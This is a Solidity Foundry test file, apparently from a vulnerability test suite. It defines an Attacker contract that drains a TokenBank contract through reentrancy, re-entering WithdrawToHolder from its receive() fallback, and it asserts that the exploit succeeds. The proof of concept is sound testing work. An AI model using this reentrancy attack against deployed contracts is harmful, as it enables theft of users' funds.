
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    using stdStorage for StdStorage;
    
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        vm.assume(attackVal >= 1 ether);

        _contractUnderTest.changeOwner(address(_attacker));
        vm.prank(address(_attacker));
        _contractUnderTest.confirmOwner();

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedValue;

    constructor(address victimAddress) { 
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value >= val * 2, "Insufficient funds for deposit");
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedValue = val;
        
        victim.WithdrawToHolder(address(this), val);
        
        if (address(this).balance == initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            victim.WithdrawToHolder(address(this), storedValue);
            attackCallCount++;
        }
    }
}
